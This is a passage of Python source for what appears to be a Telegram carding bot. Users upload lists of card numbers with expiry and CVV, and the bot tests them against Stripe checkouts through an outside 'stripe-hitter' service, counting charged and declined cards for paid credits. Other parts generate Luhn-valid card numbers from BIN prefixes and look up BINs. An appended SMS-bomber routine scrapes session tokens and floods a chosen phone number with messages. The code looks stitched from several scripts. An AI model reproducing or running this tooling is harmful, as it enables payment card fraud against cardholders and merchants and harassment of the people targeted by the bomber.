                f"Progress: {CHECKED_ST}/{total_cards} | "
                f"Charged: {CHARGED_ST} | Declined: {DECLINED_ST} | Errors: {ERROR_ST}\n"
                f"Elapsed: {elapsed:.1f}s | Avg: {avg_time:.1f}s/card",
                parse_mode='HTML'
            )
        except Exception as e:
            logger.warning(f"Progress edit failed: {e}")
    
    # Completion
    total_time = time.time() - start_time
    status = "✅ Completed" if not STOP_MASS else "🛑 Stopped"
    remaining = get_user_credits(user_id)
    await msg.reply_text(
        f"{status}!\n"
        f"Processed: {CHECKED_ST}/{total_cards}\n"
        f"Charged: {successful} 💳 | Declined: {declined} ❌ | Errors: {errors} ⚠️\n"
        f"Total Time: {total_time:.1f}s | Credits Left: {remaining}\n"
        f"File: {os.path.basename(file_name)}",
        parse_mode='HTML'
    )
    STOP_MASS = False

# ---------------- /mass command (inline text) ----------------
async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, _, _, username = get_msg_user_info(update)

    query = update.callback_query

    if query:
        await query.answer()
        user = query.from_user
        chat = query.message.chat
    else:
        user = msg.from_user
        chat = msg.chat

    db = await load_user_db()
    if str(user.id) not in db:
        if query:
            await query.edit_message_text("You need to register first using /register.")
        else:
            await msg.reply_text("You need to register first using /register.")
        return

    # in groups, mass checks disabled
    if chat.type != "private":
        if query:
            await query.edit_message_text("Mass checks disabled in groups. Use single-card commands instead.")
        else:
            await msg.reply_text("Mass checks disabled in groups. Use single-card commands instead.")
        return
    
    # Parse cards from args/message (split by space/newline, filter valid)
    card_list_raw = " ".join(context.args) if context.args else ""
    if not card_list_raw:
        full = msg.text.strip() if msg.text else ""
        parts = full.split(maxsplit=1)
        card_list_raw = parts[1] if len(parts) >= 2 else ""
    
    if not card_list_raw:
        await msg.reply_text("❌ Provide cards: /mass card1 card2 ... or card1|mm|yy|cvv per line")
        return
    
    # Simple split; assume one card per arg or line
    cards = [card.strip() for card in re.split(r'[\s\n]+', card_list_raw) if '|' in card.strip()]
    if not cards:
        await msg.reply_text("❌ No valid cards (format: num|mm|yyyy|cvv) found.")
        return
    
    asyncio.create_task(process_mass_st(update, context, cards, username, "inline.txt"))

# ---------------- Document handler for mass (txt files) ----------------
async def mass_document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, _, _, username = get_msg_user_info(update)
    doc = msg.document
    if not doc or not doc.file_name.lower().endswith('.txt'):
        await msg.reply_text("❌ Upload a .txt file with one card per line: num|mm|yyyy|cvv")
        return
    
    try:
        file_obj = await context.bot.get_file(doc.file_id)
        data = await file_obj.download_as_bytearray()
        content = data.decode('utf-8', errors='ignore')
        cards = [line.strip() for line in content.splitlines() if line.strip() and '|' in line.strip()]
        
        if not cards:
            await msg.reply_text("❌ No valid cards in file.")
            return
        
        asyncio.create_task(process_mass_st(update, context, cards, username, doc.file_name))
    except Exception as e:
        logger.exception(f"Mass doc error: {e}")
        await msg.reply_text("❌ File processing failed.")

# ---------------- /stopmass command ----------------
async def stop_mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global STOP_MASS
    STOP_MASS = True
    await update.effective_message.reply_text("🛑 Stopping mass check after current card...")
    
# ---------------- Credits, redeem, admin commands ----------------
async def check_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, user, user_id, username = get_msg_user_info(update)

    try:
        add_user(user_id, username)
    except Exception:
        pass

    try:
        data = load_data()
        user_id_str = str(user_id)
        if user_id_str in data['users']:
            u = data['users'][user_id_str]
            credits = u.get('credits', 0)
            total_checks = u.get('total_checks', 0)
            await msg.reply_text(f"💳 𝙔𝙊𝙐𝙍 𝘼𝘾𝘾𝙊𝙐𝙉𝙏\n\n 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 ⭆ {credits}\n 𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙨 ⭆ {total_checks}\n\n𝙐𝙨𝙚 /redeem 𝙩𝙤 𝙖𝙙𝙙 𝙢𝙤𝙧𝙚 𝙘𝙧𝙚𝙙𝙞𝙩𝙨!", parse_mode='HTML')
        else:
            await msg.reply_text("💳 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 ⭆0\n 𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙨 ⭆ 0\n\n𝙐𝙨𝙚 /redeem 𝙩𝙤 𝙖𝙙𝙙 𝙘𝙧𝙚𝙙𝙞𝙩𝙨", parse_mode='HTML')
    except Exception as e:
        logger.warning(f"check_credits failed: {e}")
        await msg.reply_text("Could not load your credits data.")

async def redeem_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, user, user_id, username = get_msg_user_info(update)
    add_user(user_id, username)

    if not context.args:
        await msg.reply_text("❌ 𝙞𝙣𝙫𝙖𝙡𝙞𝙙 𝙛𝙤𝙧𝙢𝙖𝙩𝙩 /redeem CODE")
        return

    code = " ".join(context.args).strip().upper()
    try:
        success, result = redeem_gift_code(code, user_id)
        if success:
            new_credits = get_user_credits(user_id)
            await msg.reply_text(f"𝙂𝙄𝙁𝙏 𝙘𝙤𝙙𝙚 𝙧𝙚𝙙𝙚𝙚𝙢 𝙨𝙪𝙘𝙘𝙚𝙨𝙨 ⭝\n\n𝘼𝘿𝘿𝙀𝘿 ⭆ {result} 𝘾𝙧𝙚𝙙𝙞𝙩𝙨\n💳 𝙏𝙤𝙩𝙖𝙡 𝙘𝙧𝙚𝙙𝙞𝙩𝙨 ⭆ {new_credits}")
        else:
            await msg.reply_text(f"❌ {result}")
    except Exception as e:
        logger.exception(f"redeem_code error: {e}")
        await msg.reply_text("An error occurred while redeeming the code.")

async def generate_gift(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, user, user_id, username = get_msg_user_info(update)
    
    if not is_admin_uid(user.id) and not is_owner_uid(user.id):
        await update.message.reply_text("Only Owner and Admins are allowed to use this command")
        return

    if not context.args:
        await msg.reply_text("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙁𝙤𝙧𝙢𝙖𝙩𝙩. 𝙐𝙨𝙚 /gift <credits>\n𝙚.𝙜. /gift 100")
        return
    
    try:
        credits = int(context.args[0])
    except ValueError:
        await msg.reply_text("❌ 𝙞𝙣𝙫𝙖𝙡𝙞𝙙 𝙖𝙢𝙤𝙪𝙣𝙩")
        return
    
    if is_admin_uid(user.id) and not is_owner_uid(user.id) and credits > 200:
        await update.message.reply_text("❌ Admins can gift at most 200 credits.")
        return

    if not context.args:
        await msg.reply_text("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙁𝙤𝙧𝙢𝙖𝙩𝙩. 𝙐𝙨𝙚 /gift <credits>\n𝙚.𝙜. /gift 100")
        return

    try:
        credits = int(context.args[0])
        if credits <= 0:
            await msg.reply_text("❌ Credits must be a positive number.")
            return

        code = generate_gift_code(credits, user_id)
        await msg.reply_text(f"𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 ⭐\n\n 𝘾𝙤𝙙𝙚 ⭆ `{code}`\n 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 ⭆ {credits}\n\n 𝙎𝙝𝙖𝙧𝙚 𝙩𝙤 𝙐𝙨𝙚𝙧𝙨 ⭛", parse_mode='HTML')
    except ValueError:
        await msg.reply_text("❌ 𝙞𝙣𝙫𝙖𝙡𝙞𝙙 𝙖𝙢𝙤𝙪𝙣𝙩")
    except Exception as e:
        logger.exception(f"generate_gift error: {e}")
        await msg.reply_text(f"❌ Error generating gift code: {e}")

# ---------------- Owner/Admin commands ----------------
async def cmd_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_owner_uid(user.id):
        await update.message.reply_text("⛔ Only the owner can promote admins.")
        return
    parts = (update.message.text or "").split(maxsplit=2)
    if len(parts) < 3:
        await update.message.reply_text("Usage: /promote <user_id> <nickname>")
        return
    try:
        uid = str(int(parts[1].strip()))
    except Exception:
        await update.message.reply_text("Invalid user id.")
        return
    nick = parts[2].strip()
    admins = load_admins()
    admins[uid] = nick
    save_admins(admins)
    await update.message.reply_text(f"✅ Promoted {nick} ({uid}) to admin.")

async def cmd_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_owner_uid(user.id):
        await update.message.reply_text("⛔ Only the owner can demote admins.")
        return
    parts = (update.message.text or "").split(maxsplit=1)
    if len(parts) < 2:
        await update.message.reply_text("Usage: /demote <user_id>")
        return
    try:
        uid = str(int(parts[1].strip()))
    except Exception:
        await update.message.reply_text("Invalid user id.")
        return
    admins = load_admins()
    if uid in admins:
        nick = admins.pop(uid)
        save_admins(admins)
        await update.message.reply_text(f"✅ Demoted {nick} ({uid}).")
    else:
        await update.message.reply_text("❌ That user id is not in admin list.")

async def cmd_admins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admins = load_admins()
    lines = []
    lines.append(f"👑 Owner: {OWNER_ID}")
    if not admins:
        lines.append("No admins set.")
    else:
        lines.append("Admins:")
        for uid, nick in admins.items():
            lines.append(f"• {nick} — {uid}")
    await update.message.reply_text("\\n".join(lines))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline button selections."""
    query = update.callback_query
    await query.answer()
    if query.data == "opt1":
        await query.edit_message_text("⚡ *Selected CHARGE-GATES* ⚡\nUpload a TXT file and reply with /st to start.", parse_mode="HTML")
    elif query.data == "opt2":
        await query.edit_message_text("💳 *Selected FREE-GATES* 💳\nUpload a TXT file and reply with /st to start.", parse_mode="HTML")
        
        
async def add_credits_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, user, user_id, username = get_msg_user_info(update)

    if user_id != OWNER_ID:
        await msg.reply_text("❌ 𝙐𝙉𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 ")
        return

    if len(context.args) < 2:
        await msg.reply_text("❌ 𝙞𝙣𝙫𝙖𝙡𝙞𝙙 𝙛𝙤𝙧𝙢𝙖𝙩𝙩. 𝙐𝙨𝙚 /addcredits <user_id> <credits>\nExample: /addcredits 123456789 100")
        return

    try:
        target_user_id = int(context.args[0])
        credits = int(context.args[1])
        if credits <= 0:
            await msg.reply_text("❌ Credits must be a positive number.")
            return

        add_credits(target_user_id, credits)
        new_balance = get_user_credits(target_user_id)
        await msg.reply_text(f"✅ Credits added successfully!\n\n👤 User ID: {target_user_id}\n💰 Added: {credits} credits\n💳 New Balance: {new_balance}")
    except ValueError:
        await msg.reply_text("❌ Invalid input. Please provide valid numbers.")
    except Exception as e:
        logger.exception(f"add_credits_admin error: {e}")
        await msg.reply_text(f"❌ Error adding credits: {e}")

async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, user, user_id, username = get_msg_user_info(update)

    if not is_admin_uid(user_id) and user_id != OWNER_ID:
        await msg.reply_text("❌ You are not authorized to use this command.")
        return

    try:
        data = load_data()
        total_users = len(data['users'])
        total_checks = sum(u.get('total_checks', 0) for u in data['users'].values())
        total_credits = sum(u.get('credits', 0) for u in data['users'].values())
        unused_codes = sum(1 for code in data['gift_codes'].values() if not code['is_used'])
        used_codes = sum(1 for code in data['gift_codes'].values() if code['is_used'])
        
        # Get top users
        top_users = sorted(
            [(uid, u.get('total_checks', 0), u.get('username', 'Unknown')) 
             for uid, u in data['users'].items()],
            key=lambda x: x[1],
            reverse=True
        )[:5]
        
        top_users_text = "\n".join([
            f"{i+1}. {uname} - {checks} checks"
            for i, (uid, checks, uname) in enumerate(top_users)
        ])

        stats_text = f"""
╔═══════════════════════╗
    📊 **BOT STATISTICS**
╚═══════════════════════╝

👥 **Total Users:** `{total_users}`
✅ **Total Checks:** `{total_checks}`
💰 **Total Credits:** `{total_credits}`

🎁 **Gift Codes:**
   • Active: `{unused_codes}`
   • Redeemed: `{used_codes}`

━━━━━━━━━━━━━━━━━━━━

🏆 **TOP 5 USERS:**
{top_users_text}

━━━━━━━━━━━━━━━━━━━━

⏰ **Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👑 **Admin:** @technopile
"""
        
        keyboard = [
            [
                InlineKeyboardButton("🔄 Refresh", callback_data="stats_bot"),
                InlineKeyboardButton("👥 All Users", callback_data="stats_allusers")
            ],
            [InlineKeyboardButton("⬅️ Back", callback_data="menu_main")]
        ]
        
        await msg.reply_text(
            stats_text, 
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    except Exception as e:
        logger.exception(f"show_stats error: {e}")
        await msg.reply_text(f"❌ Error fetching stats: {e}")

# ========== LEADERBOARD FEATURE ==========
async def show_leaderboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show leaderboard of top users"""
    msg = update.effective_message
    
    try:
        data = load_data()
        
        # Sort users by total checks
        sorted_users = sorted(
            [(uid, u.get('total_checks', 0), u.get('username', 'Unknown'), u.get('credits', 0)) 
             for uid, u in data['users'].items()],
            key=lambda x: x[1],
            reverse=True
        )[:20]  # Top 20
        
        if not sorted_users:
            await msg.reply_text("📊 No users found!")
            return
        
        leaderboard_text = """
🏆 **LEADERBOARD - TOP CHECKERS**
━━━━━━━━━━━━━━━━━━━━

"""
        
        medals = ["🥇", "🥈", "🥉"]
        
        for idx, (uid, checks, uname, credits) in enumerate(sorted_users, 1):
            medal = medals[idx-1] if idx <= 3 else f"{idx}."
            leaderboard_text += f"{medal} **{uname}**\n"
            leaderboard_text += f"   ✅ {checks} checks | 💰 {credits} credits\n\n"
        
        leaderboard_text += f"""━━━━━━━━━━━━━━━━━━━━
⏰ Updated: {datetime.now().strftime('%H:%M:%S')}
"""
        
        keyboard = [
            [
                InlineKeyboardButton("🔄 Refresh", callback_data="stats_leaderboard"),
                InlineKeyboardButton("📈 My Rank", callback_data="stats_personal")
            ],
            [InlineKeyboardButton("⬅️ Back", callback_data="menu_stats")]
        ]
        
        await msg.reply_text(
            leaderboard_text,
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
    except Exception as e:
        logger.exception(f"Leaderboard error: {e}")
        await msg.reply_text("❌ Failed to load leaderboard")

# ========== END STATISTICS FEATURES ==========
        
        
def luhn_check_digit(number_without_check: str) -> str:
    digits = [int(d) for d in number_without_check]
    parity = (len(digits) + 1) % 2
    total = 0
    for i, d in enumerate(digits):
        if (i % 2) == parity:
            dd = d * 2
            if dd > 9:
                dd -= 9
            total += dd
        else:
            total += d
    check = (10 - (total % 10)) % 10
    return str(check)
        

def fill_pan_with_luhn(prefix: str) -> str:
    # Replace x/X with random digits; keep digits from prefix
    s_chars = []
    for ch in prefix:
        if ch in ("x", "X"):
            s_chars.append(random.choice(string.digits))
        else:
            s_chars.append(ch)
    s = "".join(s_chars)
    # keep digits only
    s = "".join([c for c in s if c.isdigit()])
    # base 15 digits (without check digit)
    if len(s) >= 15:
        base15 = s[:15]
    else:
        base15 = s + "".join(random.choice(string.digits) for _ in range(15 - len(s)))
    check = luhn_check_digit(base15)
    return base15 + check

def gen_cvv_for_template(cvv_template: str) -> str:
    # If template contains 'x' or 'X', replace each with a random digit.
    if any(ch in ("x","X") for ch in cvv_template):
        out = []
        for ch in cvv_template:
            if ch in ("x","X"):
                out.append(random.choice(string.digits))
            elif ch.isdigit():
                out.append(ch)
            else:
                out.append("0")
        return "".join(out)
    # if purely numeric, return as-is; else default to random 3-digit
    if cvv_template.isdigit():
        return cvv_template
    return "".join(random.choice(string.digits) for _ in range(3))


async def cmd_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Generate Luhn-valid cards supporting 'x' placeholders and random CVV placeholders.
    Usage: /gen <bin_or_prefix_with_x>|<mm or xx>|<yy or xx>|<cvv or cvv_template> [count]
    Examples:
      /gen 451629xxxxxx|xx|xx|206 300
      /gen 4516642833xxxx|xx|xx|xxx    (defaults to 10 cards)
    """
    user = update.effective_user
    # require registration
    db = await load_user_db()
    if str(user.id) not in db:
        await update.message.reply_text("Please /register first.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /gen <bin_or_prefix>|<mm>|<yy>|<cvv> [count]. Example: /gen 451629xxxxxx|xx|xx|206 20")
        return

    # If last arg numeric -> use as count, else default to 10
    last = context.args[-1]
    if last.isdigit():
        count = int(last)
        pattern = " ".join(context.args[:-1]).strip()
    else:
        count = 10  # default
        pattern = " ".join(context.args).strip()

    if not pattern or "|" not in pattern:
        await update.message.reply_text("Pattern must be <bin_or_prefix>|<mm>|<yy>|<cvv>. Example: 451629xxxxxx|xx|xx|206")
        return

    parts = [p.strip() for p in pattern.split("|")]
    if len(parts) < 4:
        await update.message.reply_text("Pattern must contain bin/mm/yy/cvv separated by '|'. Example: 451629xxxxxx|xx|xx|206")
        return

    bin_prefix, mm_part, yy_part, cvv_template = parts[:4]

    if count <= 0 or count > 5000:
        await update.message.reply_text("Count must be between 1 and 5000.")
        return

    def gen_month():
        return f"{random.randint(1,12):02d}"

    cur_year = datetime.now(timezone.utc).year % 100
    def gen_year():
        return f"{random.randint(cur_year, cur_year + 5):02d}"

    cards = []
    for _ in range(count):
        pan = fill_pan_with_luhn(bin_prefix)  # Luhn-valid 16-digit PAN
        mm = gen_month() if mm_part.lower() == "xx" else (mm_part if mm_part.isdigit() and 1 <= int(mm_part) <= 12 else gen_month())
        yy = gen_year() if yy_part.lower() == "xx" else (yy_part if yy_part.isdigit() else gen_year())
        cvv_val = gen_cvv_for_template(cvv_template)
        cards.append(f"{pan}|{mm}|{yy}|{cvv_val}")

    # deliver results
    if count <= 30:
        text = "\n".join(cards)
        await update.message.reply_text(f"<pre>{text}</pre>", parse_mode="HTML")
    else:
        fname = f"generated_{user.id}_{int(time.time())}.txt"
        async with aiofiles.open(fname, "w", encoding="utf-8") as f:
            await f.write("\n".join(cards))
        try:
            await update.message.reply_document(document=open(fname, "rb"))
        except Exception:
            await update.message.reply_text("Failed to send file — please try again.")
        finally:
            try:
                os.remove(fname)
            except Exception:
                pass
                

async def cmd_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /bin <bin>
    Looks up BIN using binlist (non-async) in a thread so it doesn't block the event loop.
    """
    if not context.args:
        await update.message.reply_text("Usage: /bin <bin_number> (6-8 digits is typical)")
        return

    bin_input = context.args[0].strip()
    digits = ''.join(ch for ch in bin_input if ch.isdigit())
    if len(digits) < 6:
        await update.message.reply_text("Please provide at least the first 6 digits of the BIN.")
        return

    bin_number = digits[:8]  # use up to 8 digits if present

    loop = asyncio.get_running_loop()
    try:
        info = await loop.run_in_executor(None, get_bin_info, bin_number)
        msg = (
            f"{info.get('emoji','🌍')} *BIN Info*: `{bin_number}`\n"
            f"Scheme: *{info.get('scheme','UNKNOWN')}*\n"
            f"Type: *{info.get('type','UNKNOWN')}*\n"
            f"Brand: *{info.get('brand','UNKNOWN')}*\n"
            f"Bank: *{info.get('bank','UNKNOWN')}*\n"
            f"Country: *{info.get('country','UNKNOWN')}*"
        )
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"Failed to lookup BIN: {e}")
        

                                
                                                                    
# ---------- STC: multiprocessing multi-card checkout command (enhanced) ----------
import concurrent.futures
import urllib.parse
import asyncio
import re
import os
import json
import aiohttp
from io import BytesIO
from telegram.error import RetryAfter, TimedOut, BadRequest
from telegram import Update

# Process pool
MP_STC_POOL = concurrent.futures.ProcessPoolExecutor(max_workers=8)

# Safety: only perform fallback self-checkout in STRIPE TEST MODE
TEST_STRIPE_SECRET = os.environ.get("TEST_STRIPE_SECRET")  # set sk_test_...
TEST_ONLY = os.environ.get("TEST_ONLY", "True").lower() in ("1","true","yes")

# Regexes & helpers
CS_RE = re.compile(r"(cs_(?:live|test)_[A-Za-z0-9_\-]+)")
PK_RE = re.compile(r"(pk_(?:live|test)_[A-Za-z0-9_\-]+)")
AMOUNT_RE = re.compile(r'["\']?amount["\']?\s*[:=]\s*([0-9]+)')
CURRENCY_RE = re.compile(r'["\']?currency["\']?\s*[:=]\s*["\']?([A-Za-z]{3})["\']?', re.IGNORECASE)
EMAIL_RE = re.compile(r'[\w\.\+\-]{1,64}@[\w\.\-]{2,200}\.[A-Za-z]{2,20}')
THREEDS_INDICATORS = [r"three_d_secure", r"threeDS", r"3d_secure", r"3DS", r"requires_action", r"3ds"]

def _short(s, n=120):
    if not s: return ""
    s = str(s)
    return s if len(s) <= n else s[:n-1] + "…"

# -------------------- Worker: tries external API, returns rich dict --------------------
def _stc_mp_worker_api(card: str, checkout_url: str, timeout=30):
    import requests, urllib.parse, json, re
    result = {
        "success": False, "status_code": None, "json": None,
        "raw": None, "message": None, "captcha": False,
        "amount": None, "card": card, "requires_action": False
    }
    try:
        enc_url = urllib.parse.quote_plus(checkout_url)
        enc_card = card.replace("|", "%7C")
        api_endpoint = (
            f"https://stripe-hitter.onrender.com/stripe/checkout-based/url/"
            f"{enc_url}/pay/cc/{enc_card}"
        )
        r = requests.get(api_endpoint, timeout=timeout)
        result["status_code"] = r.status_code
        text = r.text or ""
        result["raw"] = text[:20000]

        # try parse JSON
        try:
            j = r.json()
            result["json"] = j
        except Exception:
            j = None

        # Interpret JSON
        if isinstance(j, dict):
            # success
            if "success" in j:
                result["success"] = bool(j.get("success"))
            elif str(j.get("status","")).lower() in ("success","ok","charged","paid", "200"):
                result["success"] = True

            # message
            for k in ("message","msg","error","result","status_message","response"):
                if k in j and j[k]:
                    result["message"] = str(j[k])
                    break

            # amount
            if "amount" in j:
                try:
                    a = int(j["amount"])
                    if a > 10000: result["amount"] = f"{a/100:.2f}"
                    else: result["amount"] = str(a)
                    cur = j.get("currency") or j.get("currency_code") or ""
                    if cur: result["amount"] += f" {cur}"
                except:
                    result["amount"] = str(j["amount"])

            # 3DS indicator in response
            if j.get("requires_action") or j.get("next_action"):
                result["requires_action"] = True

        # fallback message from plain text
        if not result["message"]:
            snippet = re.sub(r"\s+", " ", text).strip()
            result["message"] = snippet[:240] if snippet else None

        low = text.lower()
        if any(tok in low for tok in ("captcha","recaptcha","hcaptcha","cloudflare","challenge","bot detection","are you a robot")):
            result["captcha"] = True
        if result["status_code"] in (401,403,429,451):
            result["captcha"] = result["captcha"] or True

        # look for amount in plain HTML/JS
        if not result["amount"]:
            m = re.search(r'"amount"\s*[:=]\s*([0-9]+)', text)
            if m:
                try:
                    a_int = int(m.group(1))
                    result["amount"] = f"{a_int/100:.2f}" if a_int>10000 else str(a_int)
                except:
                    result["amount"] = m.group(1)
            else:
                m2 = re.search(r'([0-9]{1,6}(?:\.[0-9]{1,2})?)\s?(inr|usd|eur|rs|₹|\$|€)', text, re.IGNORECASE)
                if m2:
                    result["amount"] = f"{m2.group(1)} {m2.group(2)}"

        # heuristic success if "charged" or "paid" appears
        if not result["success"] and isinstance(j, dict) and ("charged" in str(j).lower() or "paid" in str(j).lower()):
            result["success"] = True

        return result
    except Exception as e:
        return {"success": False, "status_code": None, "json": None, "raw": None, "message": f"Worker error: {e}", "captcha": False, "amount": None, "card": card, "requires_action": False}

# -------------------- Fallback worker: server-side test-mode PaymentIntent (Flow A) --------------------
def _stc_mp_worker_fallback(card: str, checkout_url: str, timeout=30):
    """
    Only runs when TEST_ONLY is True and TEST_STRIPE_SECRET is set.
    Uses stripe-python to create/confirm PaymentIntent in test mode (no 3DS bypass).
    Returns similar dict with requires_action flag if 3DS required.
    """
    import re, requests, json, time
    result = {"success": False, "status_code": None, "json": None, "raw": None, "message": None, "captcha": False, "amount": None, "card": card, "requires_action": False}
    try:
        # fetch checkout page for hints
        headers = {"User-Agent":"Mozilla/5.0 (compatible)"}
        r = requests.get(checkout_url, headers=headers, timeout=timeout)
        result["status_code"] = r.status_code
        text = r.text or ""
        result["raw"] = text[:20000]

        # try to extract amount/currency from page
        m_amt = re.search(r'"amount"\s*[:=]\s*([0-9]+)', text)
        if m_amt:
            try:
                a = int(m_amt.group(1)); result["amount"] = f"{a/100:.2f}"
            except: result["amount"] = m_amt.group(1)
        else:
            m2 = re.search(r'([0-9]{1,6}(?:\.[0-9]{1,2})?)\s?(inr|usd|eur|₹|\$|€)', text, re.IGNORECASE)
            if m2: result["amount"] = f"{m2.group(1)} {m2.group(2)}"

        # safety: ensure env/test usage (worker cannot access outer env easily)
        # read TEST_STRIPE_SECRET from env here
        import os
        test_key = os.environ.get("TEST_STRIPE_SECRET")
        test_only_flag = os.environ.get("TEST_ONLY","True").lower() in ("1","true","yes")
        if not (test_key and test_only_flag):
            result["message"] = "Fallback disabled: TEST_STRIPE_SECRET or TEST_ONLY missing"
            return result

        # import stripe and init
        try:
            import stripe
            stripe.api_key = test_key
        except Exception as e:
            result["message"] = f"stripe lib init error: {e}"
            return result

        # parse card
        try:
            number, mo, yr, cvc = card.split("|")
            mo = int(mo); yr = int(yr) if len(yr)>2 else 2000 + int(yr)
        except Exception as e:
            result["message"] = f"Card parse error: {e}"; return result

        # create payment method
        try:
            pm = stripe.PaymentMethod.create(type="card", card={"number":number,"exp_month":mo,"exp_year":yr,"cvc":cvc})
        except stripe.error.CardError as ce:
            err = ce.json_body.get("error",{}) if hasattr(ce,"json_body") else {}
            result["message"] = f"CardError: {err.get('message') or str(ce)}"
            return result
        except Exception as e:
            result["message"] = f"PM creation failed: {e}"; return result

        # determine amount in cents
        amount_cents = 100
        if result.get("amount"):
            try:
                val = float(str(result["amount"]).split()[0])
                amount_cents = int(round(val*100))
            except:
                amount_cents = 100

        # create + confirm PaymentIntent
        try:
            pi = stripe.PaymentIntent.create(
                amount=amount_cents,
                currency="usd",
                payment_method=pm.id,
                confirm=True,
                capture_method="automatic"
            )
        except stripe.error.CardError as ce:
            # card declined
            err = ce.json_body.get("error",{}) if hasattr(ce,"json_body") else {}
            result["message"] = f"Declined: {err.get('message') or str(ce)}"
            return result
        except Exception as e:
            # capture other stripe error
            err_json = getattr(e, "json_body", None)
            if err_json:
                result["json"] = err_json
                result["message"] = str(err_json.get("error", err_json))
            else:
                result["message"] = f"PaymentIntent create/confirm error: {e}"
            return result

        # inspect PaymentIntent
        try:
            pi_dict = pi.to_dict() if hasattr(pi,"to_dict") else (pi if isinstance(pi, dict) else {})
        except:
            pi_dict = {}
        result["json"] = pi_dict
        status = pi_dict.get("status") or pi.status if hasattr(pi,"status") else None
        result["message"] = f"PaymentIntent status: {status}"
        if status in ("succeeded","requires_capture"):
            result["success"] = True
        elif status == "requires_action":
            result["requires_action"] = True
        else:
            result["success"] = False

        # detect 3DS extra
        if pi_dict.get("next_action"):
            result["requires_action"] = True

        return result

    except Exception as e:
        return {"success": False, "status_code": None, "json": None, "raw": None, "message": f"Fallback error: {e}", "captcha": False, "amount": None, "card": card, "requires_action": False}

# -------------------- Flood-safe edit helper --------------------
async def safe_edit(message, text, parse_mode=None, attempts=4):
    for attempt in range(attempts):
        try:
            return await message.edit_text(text, parse_mode=parse_mode)
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 0.2)
        except (TimedOut, BadRequest):
            await asyncio.sleep(0.4)
        except Exception:
            await asyncio.sleep(0.5)
    return None


import asyncio
import re
import time
import logging
from datetime import datetime, timedelta

import requests
import telebot
from telebot import types
from telebot.async_telebot import AsyncTeleBot

# -------------------------------------------------
# CONFIG – put your own token here
# -------------------------------------------------
BOT_TOKEN = TOKEN # <-- CHANGE THIS
bot = AsyncTeleBot(BOT_TOKEN, parse_mode="HTML")

# In-memory storage (use Redis/DB for production)
user_state = {}      # {user_id: {"step": "await_mobile" | "await_count", "mobile": "..."}}
user_lock = {}       # {user_id: asyncio.Lock()}
last_usage = {}      # {user_id: datetime}

# -------------------------------------------------
# Helper – rate limit (5 min per user)
# -------------------------------------------------
COOLDOWN_SECONDS = 300   # 5 minutes

def can_user_run(user_id: int) -> bool:
    last = last_usage.get(user_id)
    if last is None:
        return True
    return datetime.utcnow() > last + timedelta(seconds=COOLDOWN_SECONDS)

# -------------------------------------------------
# Core bombing logic (same as your script)
# -------------------------------------------------
import re
import time
import requests
import asyncio
from datetime import datetime
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

AWAIT_MOBILE, AWAIT_COUNT = range(2)
user_state = {}
user_lock = {}
last_usage = {}
COOLDOWN_SECONDS = 60

def can_user_run(user_id: int):
    if user_id not in last_usage:
        return True
    diff = (datetime.utcnow() - last_usage[user_id]).total_seconds()
    return diff >= COOLDOWN_SECONDS

async def run_bomber(mobile: str, target_count: int, bot, chat_id: int):
    session = requests.Session()
    HEADERS = {
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "referer": "https://greatonlinetools.com/",
    }

    # Fetch page once and extract tokens immediately after (no other awaits in between)
    res = session.get("https://greatonlinetools.com/smsbomber/", headers=HEADERS, timeout=20)
    if res.status_code != 200:
        await bot.send_message(chat_id, f"❌ Failed to load page (HTTP {res.status_code})")
        return

    csrf_match = re.search(r'name="csrf_token"s+value="([^"]+)"', res.text)
    csrf_token = csrf_match.group(1) if csrf_match else None
    phpsessid = session.cookies.get("PHPSESSID")

    if not csrf_token or not phpsessid:
        await bot.send_message(chat_id, f"❌ Could not extract CSRF / PHPSESSID")
        return

    # Update session headers with PHPSESSID cookie properly
    session.headers.update({
        **HEADERS,
        "content-type": "application/json",
        "cookie": f"PHPSESSID={phpsessid}",
        "origin": "https://greatonlinetools.com",
        "referer": "https://greatonlinetools.com/smsbomber/",
        "x-requested-with": "XMLHttpRequest",
    })

    sent = 0
    attempts = 0

    while sent < target_count and attempts < target_count * 9:
        attempts += 1
        payload = {
            "mobile": mobile,
            "count": target_count,
            "country_code": "91",
            "curr_count": sent,
            "csrf_token": csrf_token,
            "request_type": "sms_bomber"
        }
